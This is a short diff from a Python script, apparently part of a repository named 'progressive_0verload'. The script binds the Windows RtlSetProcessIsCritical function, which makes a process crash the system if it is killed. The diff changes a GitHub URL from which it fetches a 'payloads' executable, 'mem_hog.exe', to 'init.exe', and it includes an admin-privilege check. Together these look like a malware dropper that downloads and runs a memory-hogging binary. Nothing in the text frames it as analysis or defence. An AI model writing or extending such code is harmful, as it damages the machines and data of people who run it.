@@ -16,7 +16,7 @@ RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
 RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
 RtlSetProcessIsCritical.restype = ctypes.c_int
 
-GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/mem_hog.exe"
+GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
 PAYLOAD_PATH = None
 
 def is_admin():
